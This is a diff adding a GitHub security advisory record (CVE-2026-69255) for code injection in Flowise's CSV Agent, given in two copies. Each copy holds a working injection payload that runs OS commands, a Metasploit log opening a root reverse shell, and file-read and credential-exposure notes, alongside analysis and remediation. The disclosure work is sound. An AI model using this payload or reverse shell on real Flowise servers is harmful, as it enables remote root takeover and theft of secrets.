@@ -1,0 +1,116 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-69255",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.2,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "description": "## UPDATE 2026-05-20: Full RCE as root VERIFIED\n\n**This is not theoretical - a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**\n\n### Verified Exploit Chain\n\n1. Python code injection via `base64_string = \"${base64String}\"` (CSVAgent.ts line 161)\n2. Pyodide `js` bridge provides access to the host Node.js process\n3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)\n4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)\n\n### Working RCE Payload\n\n```\n\";import js;e=js.globalThis.eval;e(\"process.mainModule.constructor._load('child_process').execSync('id')\");#\n```\n\n**Constraint:** No commas allowed in payload - `csvFile.split(',')` splits on all commas.\n\n### Metasploit Session Proof\n\n```\nmsf > use exploit/multi/http/flowise_csv_agent_rce\nmsf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp\nmsf > exploit\n\n[+] Authentication successful\n[+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4\n[*] Sending stage (3090404 bytes) to 172.17.0.2\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)\n\nmeterpreter > getuid\nServer username: root\n\nmeterpreter > sysinfo\nComputer     : cbce3fb352b7\nOS           : Linux 6.8.0-111-generic\nArchitecture : x64\nMeterpreter  : x64/linux\n\nmeterpreter > shell\n# id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n\n# uname -a\nLinux cbce3fb352b7 6.8.0-111-generic x86_64 Linux\n```\n\n### Additional Verified Impact\n\n**Credential Theft:**\n```\nFLOWISE_PASSWORD=admin123\nDATABASE_PATH=/root/.flowise\nAPIKEY_PATH=...\n```\n\n**Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` → `cbce3fb352b7`\n\n**Server DoS** - certain native binding calls (spawn_sync) crash the Node.js process entirely.\n\n### CVSS v3.1: 9.9 CRITICAL\n\n`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\n\n---\n\n## Original Report (below)\n\n## Vulnerable Code\n\n**File:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`\n\n**Lines 133-138** - Unsanitized string extraction from data URI via `file.split(',').pop().pop()` - no validation on content.\n\n**Lines 155-171** - Direct interpolation into executable Python code:\n`base64_string = \"${base64String}\"` is inserted into a Python string literal via JS template literal. If the string contains a closing double-quote followed by Python code, it breaks out of the string context.\n\n`validatePythonCodeForDataFrame()` denylist is only applied to LLM-generated code at line 198, NOT to this initial code block at line 171.\n\n## Remediation\n\n**Option 1 (Best):** Use `pyodide.globals.set('base64_string', base64String)` instead of string interpolation\n\n**Option 2:** Validate base64 before interpolation - reject if not matching `/^[A-Za-z0-9+/=]*$/`\n\n**Option 3:** Escape special characters (`\"`, `\\n`, `\\r`, `\\\\`) before interpolation\n\n## Related CVEs\n- CVE-2026-41264 (CSV Agent regex bypass)\n- CVE-2026-41265 (Airtable Agent sandbox bypass)\n- CVE-2026-46442 (NodeVM sandbox escape)\n\n**Disclosure:** Identified with AI assistance (Claude Code). Analysis, verification, and Metasploit module by S9S Bounty-LAB / Kamal Sentassi.",
+    "ghsa_id": "GHSA-vmv7-4m6c-3cg5",
+    "html_url": "https://github.com/advisories/GHSA-vmv7-4m6c-3cg5",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vmv7-4m6c-3cg5"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-69255"
+      }
+    ],
+    "published_at": "2026-08-04T15:40:28Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vmv7-4m6c-3cg5",
+      "https://github.com/FlowiseAI/Flowise/pull/6499",
+      "https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+      "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.3",
+      "https://github.com/advisories/GHSA-vmv7-4m6c-3cg5"
+    ],
+    "severity": "critical",
+    "summary": "Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection - Root Shell Verified",
+    "updated_at": "2026-08-04T15:41:24Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.3",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.1.2"
+      },
+      {
+        "first_patched_version": "3.1.3",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "vulnerable_version_range": "<= 3.1.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-vmv7-4m6c-3cg5",
+  "repo": {
+    "cve_id": "CVE-2026-69255",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.2,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "description": "## UPDATE 2026-05-20: Full RCE as root VERIFIED\r\n\r\n**This is not theoretical - a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**\r\n\r\n### Verified Exploit Chain\r\n\r\n1. Python code injection via `base64_string = \"${base64String}\"` (CSVAgent.ts line 161)\r\n2. Pyodide `js` bridge provides access to the host Node.js process\r\n3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)\r\n4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)\r\n\r\n### Working RCE Payload\r\n\r\n```\r\n\";import js;e=js.globalThis.eval;e(\"process.mainModule.constructor._load('child_process').execSync('id')\");#\r\n```\r\n\r\n**Constraint:** No commas allowed in payload - `csvFile.split(',')` splits on all commas.\r\n\r\n### Metasploit Session Proof\r\n\r\n```\r\nmsf > use exploit/multi/http/flowise_csv_agent_rce\r\nmsf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp\r\nmsf > exploit\r\n\r\n[+] Authentication successful\r\n[+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4\r\n[*] Sending stage (3090404 bytes) to 172.17.0.2\r\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\n\r\nmeterpreter > sysinfo\r\nComputer     : cbce3fb352b7\r\nOS           : Linux 6.8.0-111-generic\r\nArchitecture : x64\r\nMeterpreter  : x64/linux\r\n\r\nmeterpreter > shell\r\n# id\r\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\r\n\r\n# uname -a\r\nLinux cbce3fb352b7 6.8.0-111-generic x86_64 Linux\r\n```\r\n\r\n### Additional Verified Impact\r\n\r\n**Credential Theft:**\r\n```\r\nFLOWISE_PASSWORD=admin123\r\nDATABASE_PATH=/root/.flowise\r\nAPIKEY_PATH=...\r\n```\r\n\r\n**Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` → `cbce3fb352b7`\r\n\r\n**Server DoS** - certain native binding calls (spawn_sync) crash the Node.js process entirely.\r\n\r\n### CVSS v3.1: 9.9 CRITICAL\r\n\r\n`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\r\n\r\n---\r\n\r\n## Original Report (below)\r\n\r\n## Vulnerable Code\r\n\r\n**File:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`\r\n\r\n**Lines 133-138** - Unsanitized string extraction from data URI via `file.split(',').pop().pop()` - no validation on content.\r\n\r\n**Lines 155-171** - Direct interpolation into executable Python code:\r\n`base64_string = \"${base64String}\"` is inserted into a Python string literal via JS template literal. If the string contains a closing double-quote followed by Python code, it breaks out of the string context.\r\n\r\n`validatePythonCodeForDataFrame()` denylist is only applied to LLM-generated code at line 198, NOT to this initial code block at line 171.\r\n\r\n## Remediation\r\n\r\n**Option 1 (Best):** Use `pyodide.globals.set('base64_string', base64String)` instead of string interpolation\r\n\r\n**Option 2:** Validate base64 before interpolation - reject if not matching `/^[A-Za-z0-9+/=]*$/`\r\n\r\n**Option 3:** Escape special characters (`\"`, `\\n`, `\\r`, `\\\\`) before interpolation\r\n\r\n## Related CVEs\r\n- CVE-2026-41264 (CSV Agent regex bypass)\r\n- CVE-2026-41265 (Airtable Agent sandbox bypass)\r\n- CVE-2026-46442 (NodeVM sandbox escape)\r\n\r\n**Disclosure:** Identified with AI assistance (Claude Code). Analysis, verification, and Metasploit module by S9S Bounty-LAB / Kamal Sentassi.",
+    "ghsa_id": "GHSA-vmv7-4m6c-3cg5",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vmv7-4m6c-3cg5",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vmv7-4m6c-3cg5"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-69255"
+      }
+    ],
+    "published_at": "2026-07-29T21:08:36Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "CSV Agent Remote Code Execution via Pyodide Code Injection - Root Shell Verified",
+    "updated_at": "2026-08-04T15:38:35Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.3",
+        "vulnerable_version_range": "<= 3.1.2"
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "patched_versions": "3.1.3",
+        "vulnerable_version_range": "<= 3.1.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
